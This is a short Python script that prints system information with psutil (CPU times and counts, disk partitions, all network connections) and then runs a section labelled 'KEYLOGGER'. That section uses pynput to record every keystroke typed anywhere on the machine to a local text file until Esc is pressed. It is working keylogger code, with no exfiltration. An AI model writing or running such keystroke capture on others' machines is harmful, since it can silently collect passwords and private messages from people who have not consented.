import psutil
# CPU INFO
# cpu_times and cpu_percent are kept to false so there values don't run, simple change to "True" to see their values outputs
print (psutil.cpu_times(percpu=False))
print (psutil.cpu_percent(interval=None, percpu=False))

print("\n")

print (psutil.cpu_count())

print("\n")

print (psutil.cpu_count(logical=True))

print("\n")

print (psutil.cpu_stats())

print("\n")

# DISK INFO
# Return all mounted disk partitions as a list of named tuples including device, mount point and filesystem type
dps = psutil.disk_partitions(all=False)
fmt_str = "{:<8} {:<7} {:<7}"
print(fmt_str.format("Drive", "Type", "Opts"))
# Solely display a couple of different types of devices, for conciseness.
for i in (0, 2):
    dp = dps[i]
    print(fmt_str.format(dp.device, dp.fstype, dp.opts))
    

# NET_CONNECTIONS
# Return system-wide socket connections as a list of named tuples, a
# Any kind of value such as tcp, inet4,udp,etc... can fill in the bracket within these "" to obtain their connection information
print("\n")
print (psutil.net_connections())


print("\n")
print("\n")

# KEYLOGGER
from pynput.keyboard import Key, Listener
import subprocess

print(subprocess.Popen("echo START TYPING ANYWHERE...",
                       shell=True,
                       stdout=subprocess.PIPE,
                       universal_newlines=True).communicate()[0])


def writetofile(key):
        keydata = str(key)
        with open("sc947recording.txt", 'a') as f:
            f.write(keydata)

# import string
# string_key.capitalize()
# string_key:

                       
# To break out of the loop if the Esc key is pressed
def on_release(key):
	if key == Key.esc:
		return False

with Listener(on_press=writetofile, on_release=on_release) as listener:
    listener.join()











    


    



    

